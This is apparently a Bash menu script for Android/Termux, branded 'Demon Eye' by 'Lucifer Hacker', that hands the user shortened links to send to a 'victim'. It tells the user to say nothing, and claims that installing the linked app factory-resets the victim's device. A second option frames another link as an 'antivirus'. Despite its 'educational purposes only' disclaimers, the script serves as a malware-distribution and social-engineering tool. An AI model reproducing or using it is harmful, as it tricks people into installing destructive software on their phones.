
# THIS TOOL MAKE NOT PROMOTE ANY ILLGAL USE 
# 🕸️ 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : 𝐋𝐔𝐂𝐈𝐅𝐄𝐑 🕸️
# 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 | 𝐏𝐫𝐨 𝐒𝐲𝐬𝐭𝐞𝐦
#-----------------
red="\e[91m"
rset="\e[0m"
grn="\e[92m"
ylo="\e[93m"
blue="\e[94m"
cyan="\e[96m"
pink="\e[95m"
#-----------------
# scripting start
banner(){
vid
echo -e '\e[93m 
██████╗░███████╗███╗░░░███╗░█████╗░███╗░░██╗
██╔══██╗██╔════╝████╗░████║██╔══██╗████╗░██║
██║░░██║█████╗░░██╔████╔██║██║░░██║██╔██╗██║
██║░░██║██╔══╝░░██║╚██╔╝██║██║░░██║██║╚████║
██████╔╝███████╗██║░╚═╝░██║╚█████╔╝██║░╚███║
╚═════╝░╚══════╝╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚══╝

███████╗██╗░░░██╗███████╗
██╔════╝╚██╗░██╔╝██╔════╝
█████╗░░░╚████╔╝░█████╗░░
██╔══╝░░░░╚██╔╝░░██╔══╝░░
███████╗░░░██║░░░███████╗
╚══════╝░░░╚═╝░░░╚══════╝.     

╔══════════════╗
  𝐂𝐑𝐄𝐀𝐓𝐄𝐃 𝐁𝐘 𝐋𝐔𝐂𝐈𝐅𝐄𝐑
╚══════════════╝'
echo " " 
echo -e "$red                       ▶𝗖𝗥𝗘𝗔𝗧𝗢𝗥 𝗕𝗬$grn 𝗬𝗧 : 𝗗𝗲𝗺𝗼𝗻 𝗘𝘆𝗲$red◀$rset"
echo -e "$red                      ⫸$ylo 𝗠𝗢𝗗𝗜𝗙𝗜𝗘𝗗 𝗕𝗬 𝗟𝗨𝗖𝗜𝗙𝗘𝗥 𝗛𝗔𝗖𝗞𝗘𝗥$red ⫷$rset"
echo 
# Functions
echo -e "$red                    [Infect them with fun]$rset"
echo " "
echo " "
}
baner1(){
clear
echo -e '\e[93m 
𝘼𝙉𝘿𝙍𝙊𝙄𝘿 𝙎𝙋𝘼𝙈 𝘼𝙏𝙏𝘼𝘾𝙆 🕸️
𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 : 𝙇𝙐𝘾𝙄𝙁𝙀𝙍 𝙃𝘼𝘾𝙆𝙀𝙍 🕸️
𝙁𝙄𝙇𝙀 𝙉𝘼𝙈𝙀 : 𝙎𝙋𝘼𝙈 𝘼𝙏𝙏𝘼𝘾𝙆 🕸️

⚠️ 𝗙𝗜𝗡𝗔𝗟 𝗗𝗜𝗦𝗖𝗟𝗔𝗜𝗠𝗘𝗥:
𝗧𝗛𝗜𝗦 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗜𝗦 𝗙𝗢𝗥 𝗘𝗗𝗨𝗖𝗔𝗧𝗜𝗢𝗡𝗔𝗟 𝗣𝗨𝗥𝗣𝗢𝗦𝗘𝗦 𝗢𝗡𝗟𝗬.
𝗪𝗘 𝗗𝗢 𝗡𝗢𝗧 𝗣𝗥𝗢𝗠𝗢𝗧𝗘 𝗜𝗟𝗟𝗘𝗚𝗔𝗟 𝗔𝗖𝗧𝗜𝗩𝗜𝗧𝗜𝗘𝗦.
𝗔𝗟𝗪𝗔𝗬𝗦 𝗥𝗘𝗦𝗣𝗘𝗖𝗧 𝗢𝗧𝗛𝗘𝗥𝗦❜𝗣𝗥𝗜𝗩𝗔𝗖𝗬.
╔══════════════╗
  𝐂𝐑𝐄𝐀𝐓𝐄𝐃 𝐁𝐘 𝐋𝐔𝐂𝐈𝐅𝐄𝐑
╚══════════════╝'
echo " " 
echo -e "$red                       ▶𝗖𝗥𝗘𝗔𝗧𝗢𝗥 𝗕𝗬$grn 
╔════════════════════╗
  🕸️ 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 𝐋𝐔𝐂𝐈𝐅𝐄𝐑 🕸️
╚════════════════════╝$red◀$rset"
echo -e "$red                      ⫸$ylo  
🤍 𝐓𝐇𝐀𝐍𝐊 𝐘𝐎𝐔 𝐅𝐎𝐑 𝐒𝐔𝐁𝐒𝐂𝐑𝐈𝐁𝐈𝐍𝐆 𝐌𝐘 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 🤍$red ⫷$rset"
echo 
# Functions
echo -e "$red                    [Infect them with fun]$rset"
echo " "
echo " "
}
menu(){
echo -e "$grn             ＞＞＞＞>>>＞$ylo [Options]$grn ＜<<<＜＜＜＜$rset"
echo " "
echo " "
echo -e "$red                        ➡$cyan [\e[92m1\e[96m] 𝗖𝗿𝗲𝗮𝘁𝗲 𝗡𝗼𝘄 (𝗟𝗜𝗡𝗞...)"
echo -e "$red                        ➡$cyan [\e[92m2\e[96m] 𝗦𝗔𝗩𝗘 𝗦𝗬𝗦𝗧𝗘𝗠 (𝗡𝗢 𝗘𝗡𝗖)"
echo -e "$red                        ➡$cyan [\e[92m3\e[96m] 𝗔𝗕𝗢𝗨𝗧"
echo -e "$red                        ➡$cyan [\e[92m4\e[96m] 𝗨𝗽𝗱𝗮𝘁𝗲 "
echo -e "$red                        ➡$cyan [\e[92m5\e[96m] 𝗬𝗼𝘂𝗧𝘂𝗯𝗲 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗙𝗿𝗲𝗲🕸️"
echo -e "$red                        ➡$cyan [\e[92m6\e[96m] 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗙𝗿𝗲𝗲 🕸️"
echo -e "$red                        ➡$cyan [\e[92m7\e[96m] 𝗖𝗛𝗔𝗧"
echo -e "$red                        ➡$cyan [\e[92m8\e[96m] 𝗘𝗫𝗜𝗧"
echo " "
echo " "
echo -e "$grn               >＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
echo " "
echo -ne "\e[92🕸️ 𝐋𝐔𝐂𝐈 𝐅𝐄𝐑 \e[92m: "
read optnz
if [ $optnz = "1" ];
then
virus
elif [ $optnz = "2" ];
then
save
elif [ $optnz = "3" ];
then
about
elif [ $optnz = "4" ];
then
upd
elif [ $optnz = "5" ];
then
am start -a android.intent.action.VIEW -d https://shorturl.at/OHgIy > /dev/null 2>&1
banner
menu
elif [ $optnz = "6" ];
then
am start -a android.intent.action.VIEW -d https://shorturl.at/Za228 > /dev/null 2>&1
banner
menu
elif [ $optnz = "7" ];
then
am start -a android.intent.action.VIEW -d https://shorturl.at/37y4M > /dev/null 2>&1
banner
menu
elif [ $optnz = "8" ];
then
exit 1
else
echo "wrong"
exit
fi
}
virus(){
################
clear
echo
echo -e '\e[92m 
╔════════════════════╗
  🕸️ 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 𝐋𝐔𝐂𝐈𝐅𝐄𝐑 🕸️
╚════════════════════╝ '
echo " "
echo -e "\e[91m 😈  𝗖𝗼𝗽𝘆 𝗯𝗲𝗹𝗼𝘄 𝗹𝗶𝗻𝗸 𝗮𝗻𝗱 𝘀𝗲𝗻𝗱 𝗶𝘁 𝘆𝗼𝘂𝗿 𝘃𝗶𝗰𝘁𝗶𝗺 𝗮𝗻𝗱 
𝘀𝗮𝘆 𝗻𝗼𝘁𝗵𝗶𝗻𝗴 𝘁𝗼 𝗵𝗶𝗺. 𝘄𝗵𝗲𝗻 𝗵𝗲 𝗶𝗻𝘀𝘁𝗮𝗹𝗹 𝗶𝘁 𝗶𝗻 𝗵𝗶𝘀 
𝗱𝗲𝘃𝗶𝗰𝗲 𝗶𝘁 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗳𝗮𝗰𝘁𝗼𝗿𝘆 𝗿𝗲𝘀𝗲𝘁 𝗮𝗻𝗱 𝗹𝗼𝘁 𝗺𝗼𝗿𝗲 𝗵𝗮𝗽𝗽𝗲𝗻𝘀.
                                👇👇👇

         \e[92mL1NK :- \e[96mhttps://tinyurl.com/uppdatesnew\e[91m

                                 👆👆👆
𝗨𝘀𝗲 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗳𝘂𝗻 𝗽𝘂𝗿𝗽𝗼𝘀𝗲 𝗻𝗼𝘁 𝗳𝗼𝗿 𝗵𝗮𝗿𝗺𝗶𝗻𝗴 𝘀𝗼𝗺𝗲𝗼𝗻𝗲 😇✌️.
𝗔𝗻𝗱 𝗼𝘂𝗿 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗶𝘀 𝗻𝗼𝘁 𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗶𝗯𝗹𝗲 𝗳𝗼𝗿 𝗮𝗻𝘆 𝗸𝗶𝗻𝗱 𝗼𝗳 𝗹𝗼𝘀𝘀 
𝘆𝗼𝘂 𝗱𝗼 𝘁𝗼 𝗼𝘁𝗵𝗲𝗿❜𝘀 𝗯𝘆 𝘁𝗵𝗶𝘀 𝘀𝗰𝗿𝗶𝗽𝘁."
echo
echo -ne "\e[92m#Type exit : "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
save(){
clear
echo
echo -e '\e[92m 
         ──▐─▌──▐─▌──
         ─▐▌─▐▌▐▌─▐▌─
         ─█▄▀▄██▄▀▄█─
         ──▄──██▌─▄──
         ▄▀─█▀██▀█─▀▄
         ▐▌▐▌─▐▌─▐▌▐▌
         ─▐─█────█─▌─
         ────▌──▐────
   𝗠𝗢𝗗𝗜𝗙𝗜𝗘𝗗 𝗕𝗬 𝗟𝗨𝗖𝗜𝗙𝗘𝗥 𝗛𝗔𝗖𝗞𝗘𝗥 '
echo " "
echo " "
echo -e "\e[93m  𝗖𝗼𝗽𝘆 𝗯𝗲𝗹𝗼𝘄 𝗹𝗶𝗻𝗸 𝗮𝗻𝗱 𝘀𝗲𝗻𝗱 𝗶𝘁 𝘆𝗼𝘂𝗿 𝘃𝗶𝗰𝘁𝗶𝗺 𝗮𝗻𝗱 𝘁𝗲𝗹𝗹 𝗵𝗶𝗺
𝘁𝗵𝗮𝘁 𝗵𝗲 𝘀𝗵𝗼𝘂𝗹𝗱 𝗶𝗻𝘀𝘁𝗮𝗹𝗹 𝘁𝗵𝗶𝘀 𝗮𝗽𝗽𝗹𝗶𝗰𝗮𝘁𝗶𝗼𝗻 𝗼𝗿 𝗲𝗹𝘀𝗲 𝗵𝗶𝘀 
𝗱𝗲𝘃𝗶𝗰𝗲 𝘄𝗶𝗹𝗹 𝗻𝗼𝘁 𝗯𝗲 𝗿𝗲𝗰𝗼𝘃𝗲𝗿𝗲𝗱.(𝗔𝗻𝘁𝗶𝘃𝗶𝗿𝘂𝘀)
                    👇👇👇

        \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m

                    👆👆👆
𝗨𝘀𝗲 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗳𝘂𝗻 𝗽𝘂𝗿𝗽𝗼𝘀𝗲 𝗻𝗼𝘁 𝗳𝗼𝗿 𝗵𝗮𝗿𝗺𝗶𝗻𝗴 𝘀𝗼𝗺𝗲𝗼𝗻𝗲 😇✌️. 
𝗔𝗻𝗱 𝗼𝘂𝗿 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗶𝘀 𝗻𝗼𝘁 𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗶𝗯𝗹𝗲 𝗳𝗼𝗿 𝗮𝗻𝘆 𝗸𝗶𝗻𝗱 𝗼𝗳 
𝗹𝗼𝘀𝘀 𝘆𝗼𝘂 𝗱𝗼 𝘁𝗼 𝗼𝘁𝗵𝗲𝗿❜𝘀 𝗯𝘆 𝘁𝗵𝗶𝘀 𝘀𝗰𝗿𝗶𝗽𝘁."
echo
echo -ne "\e[92m#Type exit : "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
about(){
clear
echo -e '\e[91m
         ──▐─▌──▐─▌──
         ─▐▌─▐▌▐▌─▐▌─
         ─█▄▀▄██▄▀▄█─
         ──▄──██▌─▄──
         ▄▀─█▀██▀█─▀▄
         ▐▌▐▌─▐▌─▐▌▐▌
         ─▐─█────█─▌─
         ────▌──▐────
   𝗠𝗢𝗗𝗜𝗙𝗜𝗘𝗗 𝗕𝗬 𝗟𝗨𝗖𝗜𝗙𝗘𝗥 𝗛𝗔𝗖𝗞𝗘𝗥
>𝐅𝐈𝐋𝐄 | 𝐃𝐄𝐌𝐎𝐍 𝐄𝐘𝐄 𝐒𝐔𝐏𝐏𝐎𝐑𝐓 🕸️

╔════════════════════╗
  🕷️ 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 𝐎𝐖𝐍𝐄𝐑 𝐈𝐍𝐅𝐎
╚════════════════════╝

👤 𝐍𝐀𝐌𝐄 : 𝐋𝐔𝐂𝐈𝐅𝐄𝐑  
🕸️ 𝐑𝐎𝐋𝐄 : 𝐎𝐖𝐍𝐄𝐑 & 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑  
⚙️ 𝐒𝐏𝐄𝐂𝐈𝐀𝐋𝐈𝐓𝐘 : 𝐁𝐎𝐓 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐌𝐄𝐍𝐓 & 𝐓𝐄𝐂𝐇 𝐓𝐄𝐒𝐓𝐈𝐍𝐆  
🚀 𝐄𝐗𝐏𝐄𝐑𝐈𝐄𝐍𝐂𝐄 : 𝐀𝐃𝐕𝐀𝐍𝐂𝐄𝐃 𝐓𝐄𝐂𝐇 𝐒𝐘𝐒𝐓𝐄𝐌𝐒  

━━━━━━━━━━━━━━━━━━
🎯 𝐎𝐖𝐍𝐄𝐑 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐈𝐁𝐈𝐋𝐈𝐓𝐘 :

🕸️ 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓  
⚙️ 𝐁𝐎𝐓 & 𝐒𝐘𝐒𝐓𝐄𝐌 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐌𝐄𝐍𝐓  
📹 𝐂𝐎𝐍𝐓𝐄𝐍𝐓 & 𝐕𝐈𝐃𝐄𝐎 𝐔𝐏𝐃𝐀𝐓𝐄𝐒  
🔐 𝐒𝐄𝐂𝐔𝐑𝐈𝐓𝐘 & 𝐒𝐔𝐏𝐏𝐎𝐑𝐓  

━━━━━━━━━━━━━━━━━━
⚠️ 𝐎𝐖𝐍𝐄𝐑 𝐍𝐎𝐓𝐈𝐂𝐄 :

𝐀𝐋𝐋 𝐂𝐎𝐍𝐓𝐄𝐍𝐓 𝐈𝐒 𝐒𝐇𝐀𝐑𝐄𝐃  
𝐅𝐎𝐑 𝐄𝐃𝐔𝐂𝐀𝐓𝐈𝐎𝐍𝐀𝐋 𝐏𝐔𝐑𝐏𝐎𝐒𝐄 𝐎𝐍𝐋𝐘.  
𝐀𝐍𝐘 𝐌𝐈𝐒𝐔𝐒𝐄 𝐈𝐒 𝐍𝐎𝐓 𝐒𝐔𝐏𝐏𝐎𝐑𝐓𝐄𝐃.  
𝐔𝐒𝐄 𝐀𝐓 𝐘𝐎𝐔𝐑 𝐎𝐖𝐍 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐈𝐁𝐈𝐋𝐈𝐓𝐘.  

━━━━━━━━━━━━━━━━━━
📌 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 :
👉 @𝐍𝐞𝐱𝐭_𝐃𝐘𝐒  
━━━━━━━━━━━━━━━━━━
🕸️ 𝐎𝐖𝐍𝐄𝐑 : 𝐋𝐔𝐂𝐈𝐅𝐄𝐑 🕸️  
🔥 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 @𝐍𝐞𝐱𝐭_𝐃𝐘𝐒 🔥
'
sleep 6.0
banner
menu
}
upd(){
if [ -d "$HOME/infect" ];
then
cd $HOME
rm -rf infect
elif [ -d "$HOME/Infect" ];
then
cd $HOME
rm -rf Infect
else
echo
exit 1
fi
cd $HOME
sleep 1
echo -e "         \e[96mUPDATE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
echo
printf "                     \e[96m["
# While process is running...
while git clone https://github.com/noob-hackers/infect 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
echo
echo
echo
printf "\e[96m           UPDATE SUCCESSFULL (LATEST VERSION)..!\e[0m"
sleep 2.0
cd $HOME
cd infect
bash infect.sh
}
vid(){
FILE=$HOME/infect/noob.noob
if [ -f "$FILE" ]; then
pop
else
echo
fi
}
pop(){
clear
echo -e "\e[96m                ╔═══════════════════════════════════╗\e[0m"
echo -e "\e[96m                ║  \e[93mHAI, I JUST UPLOADED NEW\e[96m VIDEO   ║\e[0m"
echo -e "\e[96m                ║      WATCH NEW VIDEO NOW.....!    ║\e[0m"
echo -e "\e[96m                ║                                   ║\e[0m"
echo -e "\e[96m                ║        Select \e[92my\e[96m to watch\e[96m          ║\e[0m"
echo -e "\e[96m                ║                (\e[93mOR\e[96m)               \e[96m║\e[0m"
echo -e "\e[96m                ║        Select \e[91mt\e[96m to cancel\e[96m         ║\e[0m"
echo -e "\e[96m                ║                (\e[93mOR\e[96m)               \e[96m║\e[0m"
echo -e "\e[96m                ║     Select \e[91mz\e[96m to skipforever\e[96m       ║\e[0m"
echo -e "\e[96m                ╚═══════════════════════════════════╝\e[0m"
echo -en "\e[32mSELECT OPTION [\e[93my/\e[93mt/\e[32m\e[93mz\e[32m]: \e[0m "
read p
if [ "$p" = "y" ];
then
am start -a android.intent.action.VIEW -d https://noobhacktube.com 2>/dev/null
clear
baner1
menu
elif [ "$p" = "t" ];
then
clear
baner1
menu
elif [ "$p" = "z" ];
then
cd $HOM/infect
rm noob.noob
banner
menu
else
banner
menu
exit
fi
}
banner
menu
